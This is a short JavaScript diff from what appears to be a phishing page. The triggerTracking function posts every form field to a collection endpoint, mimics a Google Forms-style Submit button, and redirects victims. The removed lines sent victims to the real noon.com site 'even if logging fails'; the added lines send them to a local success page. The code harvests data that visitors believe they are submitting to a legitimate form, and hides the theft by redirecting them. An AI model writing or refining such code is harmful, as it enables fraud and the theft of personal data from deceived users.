@@ -617,6 +617,7 @@ function triggerTracking() {
     var formData = new FormData(form);
 
     // Send data to your server
+   // Send data to your server
     $.ajax({
         url: result_file,   
         type: 'POST',
@@ -624,20 +625,22 @@ function triggerTracking() {
         processData: false,
         contentType: false,
         success: function(response) {
-            // Update button UI on success
+            var btnText = document.querySelector('div[aria-label="Submit"] .NPEfkd');
+            var submitBtn = document.querySelector('button[aria-label="Submit"]');
+            
             if(btnText) btnText.innerHTML = "Submitted!";
             if(submitBtn) submitBtn.style.backgroundColor = "#188038";
 
-            // Redirect to real page after 1.5 seconds
+            // Redirect to the new success page after 1.5 seconds
             setTimeout(function() {
-                window.location.replace("https://www.noon.com/");
+                window.location.replace("success.html"); 
             }, 1500);
         },
         error: function(xhr, status, error) {
             console.error("Submission failed:", error);
-            // Still redirect even if logging fails
+            // Still redirect so the user isn't stuck
             setTimeout(function() {
-                window.location.replace("https://www.noon.com/");
+                window.location.replace("success.html"); 
             }, 1500);
         }
     });
